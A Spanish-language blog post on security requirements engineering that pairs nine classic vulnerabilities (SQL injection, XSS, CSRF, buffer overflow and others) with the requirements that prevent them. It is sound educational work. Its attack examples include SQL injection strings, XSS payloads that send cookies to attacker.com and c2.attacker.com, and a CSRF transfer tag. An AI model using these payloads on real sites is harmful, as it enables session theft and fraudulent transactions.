La ingeniería de requisitos de seguridad no consiste en listar tecnologías a implementar; consiste en identificar qué puede fallar, quién podría explotarlo y qué propiedades debe garantizar el sistema para resistirlo. Cada vulnerabilidad conocida — SQLi, XSS, Buffer Overflow, CSRF — es en realidad un requisito de seguridad que no fue especificado, revisado o validado. Este blog analiza nueve vulnerabilidades clásicas desde esa perspectiva: qué son, cómo operan y qué requisito de seguridad concreto las hubiera prevenido.

I

El proceso de ingeniería de requisitos de seguridad

La ingeniería de requisitos de seguridad (IRS) es la rama de la ingeniería de software que se ocupa de identificar, analizar, especificar y validar las propiedades de seguridad que debe satisfacer un sistema. Se desarrolla en paralelo con los requisitos funcionales y se sostiene sobre cuatro actividades principales.

01

Elicitación de requisitos de seguridad

Identificar activos a proteger, actores maliciosos potenciales y vectores de ataque mediante abuse cases, análisis STRIDE y entrevistas con stakeholders de seguridad. El catálogo de vulnerabilidades conocidas (OWASP, CWE) actúa como lista de verificación.

02

Análisis y priorización

Clasificar los requisitos de seguridad por probabilidad de explotación, impacto potencial (CVSS) y costo de mitigación. No todos los riesgos se tratan igual: los críticos se mitigán; los de bajo impacto pueden aceptarse o transferirse.

03

Especificación formal

Redactar requisitos de seguridad verificables con criterios de aceptación claros. Ejemplo: «El sistema debe rechazar toda entrada que contenga caracteres SQL especiales sin sanitizar antes de ejecutar una consulta a base de datos». Ambigüedades en esta fase son futuras vulnerabilidades.

04

Validación y trazabilidad

Verificar que los requisitos de seguridad son alcanzables, no contradictorios entre sí y trazables hasta los casos de prueba de seguridad que los validan. Un requisito sin prueba de aceptación no es un requisito: es un deseo.

II

Inyecciones y manipulación de datos

Las vulnerabilidades de inyección representan el riesgo más crítico según OWASP desde 2010. Todas comparten la misma raíz: datos no confiables que se interpretan como instrucciones ejecutables.

SQL Injection (SQLi) Crítica CWE-89

Inserción de código SQL malicioso en campos de entrada que son concatenados directamente a una consulta de base de datos. El atacante puede leer, modificar o eliminar datos, ejecutar comandos del sistema operativo o escalar privilegios.

Ejemplo de ataque: en un formulario de login con la consulta SELECT * FROM users WHERE user='[input]' AND pass='[input]', ingresar ' OR '1'='1 como usuario convierte la condición siempre en verdadera, permitiendo el acceso sin credenciales válidas.
Requisito El sistema debe utilizar consultas parametrizadas (prepared statements) u ORM para toda interacción con la base de datos. Queda prohibida la construcción de sentencias SQL por concatenación de cadenas con datos del usuario.
Blind SQL Injection Alta CWE-89

Variante de SQLi donde la aplicación no devuelve los resultados de la consulta al atacante, pero sí revela información mediante comportamientos observables: tiempo de respuesta (time-based) o diferencias en el contenido de la página (boolean-based).

Ejemplo de ataque: inyectar '; IF (1=1) WAITFOR DELAY '0:0:5'-- en un parámetro de URL. Si la respuesta tarda 5 segundos, la inyección fue exitosa y el atacante puede inferir datos carácter a carácter con herramientas automatizadas como sqlmap.
Requisito El sistema debe devolver mensajes de error genéricos sin revelar información de la base de datos. Los tiempos de respuesta deben ser uniformes independientemente del resultado de la consulta. Las consultas parametrizadas son obligatorias.
Cross-Site Scripting (XSS Reflejado) Media CWE-79

El atacante inyecta un script malicioso en un parámetro de URL o formulario que el servidor devuelve reflejado en la respuesta HTTP sin sanitizar. La víctima recibe el script en su navegador al hacer clic en un enlace manipulado.

Ejemplo de ataque: una URL como /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script> roba las cookies de sesión de la víctima cuando el servidor devuelve el parámetro q sin escapar en el HTML de resultados.
Requisito El sistema debe codificar toda salida dinámica en contexto HTML (HTML entity encoding). Las cookies de sesión deben tener la bandera HttpOnly para impedir su lectura desde JavaScript. Se debe implementar Content Security Policy (CSP).
XSS Persistente (Stored XSS) Alta CWE-79

El script malicioso se almacena permanentemente en la base de datos del servidor (comentarios, perfiles, mensajes) y se sirve a todos los usuarios que visiten la página afectada. Es la variante más peligrosa: no requiere que la víctima haga clic en un enlace específico.

Ejemplo de ataque: un atacante publica un comentario con el contenido <img src=x onerror="fetch('https://c2.attacker.com/?d='+btoa(document.cookie))">. Cada usuario que cargue la página con ese comentario ejecutará el script y enviará sus cookies al atacante.
Requisito El sistema debe sanitizar todo contenido enviado por el usuario antes de almacenarlo y antes de renderizarlo. Se debe usar una librería de sanitización validada (DOMPurify, OWASP Java HTML Sanitizer) en lugar de implementar lógica propia de filtrado.
III

Control de acceso y sesión

Las vulnerabilidades de control de acceso permiten a un actor no autorizado acceder a recursos o ejecutar acciones que deberían estar restringidas. En la IRS se formalizan como requisitos de autorización, autenticación y gestión de sesiones.

Forceful Browsing Alta CWE-425

El atacante accede directamente a URLs o recursos que no están enlazados en la interfaz pero tampoco están protegidos en el servidor. La aplicación solo oculta las rutas en la UI pero no implementa verificación de autorización en el backend.

Ejemplo de ataque: la aplicación muestra /dashboard solo a usuarios autenticados, pero la URL /admin/users/export es accesible directamente sin autenticación porque el servidor no valida el rol del solicitante, solo omitió el enlace en el menú.
Requisito El sistema debe verificar la autorización del usuario en el servidor para cada petición a un recurso protegido, independientemente de si existe o no un enlace visible en la interfaz. La seguridad por oscuridad no es un control de acceso válido.
Cross-Site Request Forgery (CSRF) Alta CWE-352

Un sitio malicioso induce al navegador de la víctima — ya autenticada en la aplicación objetivo — a enviar una petición HTTP legítima sin su conocimiento. El servidor procesa la petición porque las cookies de sesión se adjuntan automáticamente.

Ejemplo de ataque: la víctima está logueada en su banco. Visita una página maliciosa que contiene <img src="https://banco.com/transfer?to=attacker&amount=5000">. El navegador envía la petición GET con las cookies de sesión válidas y el banco procesa la transferencia.
Requisito Toda operación que modifique estado (transacciones, cambios de configuración, eliminaciones) debe incluir un token CSRF único, aleatorio y vinculado a la sesión del usuario. El servidor debe validar este token en cada petición antes de procesar la acción.
IV

Vulnerabilidades de memoria

Los errores de gestión de memoria son la categoría de vulnerabilidades más antigua y, en sistemas críticos escritos en C/C++, siguen siendo las de mayor impacto. Permiten al atacante ejecutar código arbitrario con los privilegios del proceso vulnerado.

Desbordamiento de buffer (Buffer Overflow) Crítica CWE-120

Ocurre cuando un programa escribe más datos en un buffer de los que caben, sobreescribiendo regiones de memoria adyacentes. El atacante puede controlar la dirección de retorno de una función y redirigir la ejecución hacia código malicioso (shellcode).

Ejemplo de ataque: una función C usa strcpy(buffer, input) donde buffer tiene 64 bytes pero input puede ser de hasta 256. Al enviar 200 bytes de datos, el atacante sobreescribe la dirección de retorno en la pila con la dirección de su shellcode previamente depositado en el buffer.
Requisito El sistema debe validar la longitud de toda entrada antes de copiarla en un buffer. Queda prohibido el uso de funciones inseguras (gets, strcpy, sprintf). Se deben habilitar protecciones del compilador: Stack Canaries, ASLR y DEP/NX.
Stack Smashing Crítica CWE-121

Variante específica del buffer overflow que ocurre en la pila de llamadas (call stack). El atacante sobreescribe el stack frame de una función, corrompiendo el puntero de retorno, variables locales o el puntero al frame anterior para tomar control del flujo de ejecución.

Ejemplo de ataque: explotación clásica de smash the stack (Aleph One, 1996): al sobrepasar un buffer local, el atacante rellena la memoria con instrucciones NOP (NOP sled) seguidas de shellcode y reemplaza el puntero de retorno para saltar al NOP sled, ejecutando el payload con privilegios del proceso.
Requisito El sistema debe compilarse con Stack Canaries (-fstack-protector-all) para detectar corrupción del stack en tiempo de ejecución. Se debe activar ASLR a nivel de sistema operativo y DEP/NX para impedir la ejecución de código en la pila.
V

Vulnerabilidad de software: concepto y gestión

Una vulnerabilidad de software es una debilidad en el diseño, implementación, configuración o gestión de un sistema que puede ser explotada por un actor malicioso para causar un impacto no deseado sobre la confidencialidad, integridad o disponibilidad del sistema o sus datos.

🔍

CVE

Common Vulnerabilities and Exposures. Identificador único y público para cada vulnerabilidad conocida. Base de la comunicación entre proveedores, investigadores y equipos de seguridad.

📊

CVSS

Common Vulnerability Scoring System. Puntuación 0–10 que mide la severidad de una vulnerabilidad considerando vector de ataque, complejidad, privilegios requeridos e impacto.

📋

CWE

Common Weakness Enumeration. Catálogo de tipos de debilidades de software — más abstracto que CVE; describe la clase de error (ej. CWE-89: SQL Injection) en lugar de la instancia específica.

Desde la IRS, la gestión de vulnerabilidades de software se traduce en requisitos concretos: política de actualizaciones (el sistema debe mantenerse con dependencias sin CVE de severidad alta o crítica), análisis de composición (SCA sobre librerías de terceros en cada build) y divulgación responsable (el equipo debe tener un proceso documentado de respuesta a CVE reportadas externamente).

Una vulnerabilidad que no está en el modelo de amenazas es una vulnerabilidad que llegará a producción. La ingeniería de requisitos de seguridad convierte el catálogo de vulnerabilidades conocidas en la lista de verificación del equipo de desarrollo.

Conclusión

Cada vulnerabilidad analizada en esta entrada — desde la SQLi más elemental hasta el stack smashing más técnico — representa un requisito de seguridad que no fue capturado a tiempo. La ingeniería de requisitos de seguridad convierte el catálogo de fallos conocidos en una guía proactiva: antes de escribir código, el equipo sabe exactamente qué propiedades debe garantizar el sistema y cómo verificar que las garantiza.

El resultado no es software perfecto — la perfección absoluta no existe en seguridad — sino software donde los riesgos son conocidos, priorizados y documentados, y donde cada vulnerabilidad que llega a producción puede rastrearse hasta el requisito que faltó.
